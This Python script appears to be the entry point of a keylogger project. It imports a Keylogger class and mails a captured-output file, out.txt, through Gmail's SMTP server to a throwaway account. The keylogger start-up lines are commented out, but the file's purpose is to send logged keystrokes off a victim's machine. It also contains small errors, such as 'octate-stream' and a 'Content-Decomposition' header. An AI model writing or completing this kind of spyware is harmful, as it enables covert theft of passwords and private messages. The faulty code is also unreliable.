import argparse, smtplib, ssl, getpass, email

from src.keylogger import Keylogger

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

#argument support
#parser = argparse.ArgumentParser()
#parser.add_argument("-o","--output",required=True,help="Name of the output file")
#args = vars(parser.parse_args())


def main():
  #basics
  subject = "test attachment email"
  sender = "throwawaydevmail@gmail.com"
  receiver = "throwawaydevmail@gmail.com"
  password = getpass.getpass()

  #Setup the MIME
  message = MIMEMultipart()
  message['From'] = sender
  message['To'] = receiver
  message['Subject'] = 'Test python email attachment'

  #The subject line
  #The body and the attachments for the mail
  attach_file_name = 'out.txt'
  attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
  payload = MIMEBase('application', 'octate-stream')
  payload.set_payload((attach_file).read())
  encoders.encode_base64(payload) #encode the attachment
  #add payload header with filename
  payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
  message.attach(payload)

  #send email
  context = ssl.create_default_context()
  try:
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls(context=context)
    server.ehlo() 
    server.login(sender, password)
    text = message.as_string()
    server.sendmail(sender, receiver, text)
    print("Successful sent email")
  except Exception as e:
    print(e)

  #keylogger = Keylogger(args["output"])
  #keylogger.start()

if __name__ == '__main__':
  main()
